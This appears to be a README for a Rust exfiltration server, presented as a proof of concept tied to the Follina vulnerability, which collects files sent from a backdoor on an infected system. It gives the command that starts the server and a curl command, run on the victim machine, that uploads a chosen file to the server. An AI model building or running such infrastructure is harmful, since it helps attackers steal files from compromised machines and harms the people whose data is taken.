An Exfiltration Server in Rust that receives and saves files from the backdoor installed in an infected system. A POC for Follina 0-day vulnerability.

- Run a Server using:
```bash
cargo r
```
- From the infected system, run the curl which includes the file to be exfiltrated.
```bash
curl -X POST -H "Content-Disposition: attachment; filename=File.pdf" -H "Content-Type: application/octet-stream" --data-binary "@File.pdf" http://localhost:8080/
```